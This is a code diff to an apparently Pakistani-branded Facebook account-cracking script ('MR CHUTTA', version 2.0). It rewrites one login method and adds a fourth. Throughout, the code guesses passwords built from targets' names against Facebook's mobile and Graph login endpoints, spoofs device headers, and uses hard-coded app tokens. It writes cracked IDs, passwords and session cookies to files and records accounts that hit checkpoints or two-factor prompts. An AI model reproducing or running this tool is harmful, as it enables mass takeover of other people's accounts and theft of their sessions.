@@ -198,11 +198,11 @@ def UA():
 logo=f"""\x1b[38;5;46m ▗▖  ▗▖▗▄▄▖      ▗▄▄▖▗▖ ▗▖▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▖ 
 \x1b[38;5;46m ▐▛▚▞▜▌▐▌ ▐▌    ▐▌   ▐▌ ▐▌▐▌ ▐▌  █    █ ▐▌ ▐▌
 \x1b[38;5;46m ▐▌  ▐▌▐▛▀▚▖    ▐▌   ▐▛▀▜▌▐▌ ▐▌  █    █ ▐▛▀▜▌
-\x1b[38;5;46m ▐▌  ▐▌▐▌ ▐▌    ▝▚▄▄▖▐▌ ▐▌▝▚▄▞▘  █    █ ▐▌ ▐▌
+\x1b[38;5;46m ▐▌  ▐▌▐▌ ▐▌    ▝▚▄▄▖▐▌ ▐▌▝▚▄▞▘  █    █ ▐▌ ▐▌______UPDATED.....
 {R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {A}[{R}●{A}] {G}FACEBOOK   {R} >>   {A}MR CHUTTA
 {A}[{R}●{A}] {G}STATUS      {R}>>   {A}FILE {R}x{A}ONLY
-{A}[{R}●{A}] {G}VERSION   {R}  >>   {A}1.5
+{A}[{R}●{A}] {G}VERSION   {R}  >>   {A}2.0
 {A}[{R}●{A}] {G}TOOL      {R}  >>   {A}PERSONAL
 {R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
@@ -221,7 +221,7 @@ def menu():
                                         time.sleep(1)
                                         menu()
                                 clear()
-                                print(f'{A}[{R}1{A}]{G} METHOD M1\n{A}[{R}2{A}]{G} METHOD M2\n{A}[{R}3{A}]{G} METHOD M3');linex()
+                                print(f'{A}[{R}1{A}]{G} METHOD M1\n{A}[{R}2{A}]{G} METHOD M2\n{A}[{R}3{A}]{G} METHOD M3\n{A}[{R}4{A}]{G} METHOD M4');linex()
                                 mthd=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                 clear()
                                 plist = []           
@@ -387,7 +387,7 @@ def api1(ids,names,passlist):
 'X-Fb-Connection-Quality': 'EXCELLENT',
 'Authorization': 'OAuth null',
 'X-Fb-Connection-Bandwidth': '24807555',
-'X-Fb-Connection-Type': 'unknown',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
 'X-Fb-Device-Group': '6060',
 'X-Tigon-Is-Retry': 'False',
 'X-Fb-Friendly-Name': 'authenticate',
@@ -405,7 +405,7 @@ def api1(ids,names,passlist):
                                         compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                         coki = f"sb={compile_coki};{get_coki}"
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/CHUTTA-M1-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
+                                        open('/sdcard/CHUTTA-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                         open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
@@ -434,47 +434,125 @@ def api1(ids,names,passlist):
                 pass
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def api2(ids,names,passlist):
-        global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [CHUTTA-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        session = requests.Session()
         try:
-                first = names.split(' ')[0]
+                global ok,loop,sim_id
+                sys.stdout.write('\r\r\033[1;37m [CHUTTA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
                 try:
-                        last = names.split(' ')[1]
+                        ln = names.split(' ')[1]
                 except:
-                        last = 'Khan'
-                ps = first.lower()
-                ps2 = last.lower()
-                for fikr in passlist:
-                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                        ua  =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-CHUTTA-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-CHUTTA-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-CHUTTA-ua-mobile': '?0','sec-CHUTTA-ua-model': '"RMX2195"','sec-CHUTTA-ua-platform': '"Android"', 'sec-CHUTTA-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetCHUTTA-site': 'same-origin', 'sec-fetCHUTTA-mode': 'navigate', 'sec-fetCHUTTA-user': '?1', 'sec-fetCHUTTA-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Aking=session.cookies.get_dict().keys()
-                        if "c_user" in Aking:
-                                coki=session.cookies.get_dict()
-                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [CHUTTA-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/CHUTTA-OK.txt', 'a').write(ids+'|'+pas+'\n')
-                                open('/sdcard/CHUTTA-M2-COOKIE-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
-                                oks.append(ids)
-                                break
-                        elif 'checkpoint' in Aking:
-                                if 'y' in pcp:
-                                        ##########print('\r\r\x1b[38;5;208m [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/CHUTTA-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                        cps.append(ids)
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
+                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.61;FBBV/787895399;FBDM/{density=1.5,width=720,height=1280};FBLC/en_IN;FBRV/387109426;FBCR/Personal;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/23116PN5BC;FBSV/14.0;nullFBCA/armeabi-v7a:armeabi;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                "adid": adid,
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": ids,
+"password": pas,
+"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
+"currently_logged_in_userid": "0",
+"locale": "en_US",
+"client_country_code": "US",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d",}
+                        headers={
+                                'User-Agent': ua,
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': '25227',
+'X-FB-SIM-HNI': '29752',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Content-Length': '706'}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [CHUTTA-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        q = po
+                                        powerCHUTTA = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CHUTTAramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CHUTTAramxan};{powerCHUTTA}"
+                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/CHUTTA-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
+                                        open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
                                         break
-                                else:
-                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                print('\r\r \033[1;34m[CHUTTA-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[1;31m\r\r [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
                         else:
-                                continue
+                                        continue
+                loop+=1
         except requests.exceptions.ConnectionError:
-                time.sleep(20)
-        except Exception as e:pass
-        loop+=1
+                time.sleep(5)
+                api2(ids,names,passlist)
+        except Exception as e:
+                pass
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def api3(ids,names,passlist):
         try:
@@ -551,12 +629,12 @@ def api3(ids,names,passlist):
 'Priority': 'u=3, i',
 'X-Fb-Sim-Hni': '45204',
 'X-Fb-Net-Hni': '45201',
-'X-Fb-Connection-Quality': 'EXCELLENT',
+'X-Fb-Connection-Quality': 'GOOD',
 'Zero-Rated': '0',
 'User-Agent': ua,
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
 'X-Fb-Connection-Bandwidth': '24807555',
-'X-Fb-Connection-Type': 'unknown',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
 'X-Fb-Device-Group': '5120',
 'X-Tigon-Is-Retry': 'False',
 'X-Fb-Friendly-Name': 'authenticate',
@@ -574,7 +652,7 @@ def api3(ids,names,passlist):
                                         compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                         coki = f"sb={compile_coki};{get_coki}"
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/CHUTTA-M3-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
+                                        open('/sdcard/CHUTTA-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                         open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
@@ -603,6 +681,46 @@ def api3(ids,names,passlist):
                 pass
                 
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M4 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
-
-                
+def api4(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r\033[1;37m [CHUTTA-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(f' ')[0]
+                try:
+                        last = names.split(f' ')[1]
+                except:
+                        last = 'Ahmed'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
+                        ua=random.choice(ugen)
+                        head = {'Host': 'mobile.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://mobile.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://mobile.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        Shahin=session.cookies.get_dict().keys()
+                        if "c_user" in Shahin:
+                                coki=session.cookies.get_dict()
+                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print(f'\r\r\033[1;32m [CHUTTA-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/CHUTTA-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                #cek_apk(session,coki)
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in Shahin:
+                                if 'y' in pcp:
+                                        print(f'\r\r\x1b[38;5;126m [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/CHUTTA-M4-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+        
 menu()
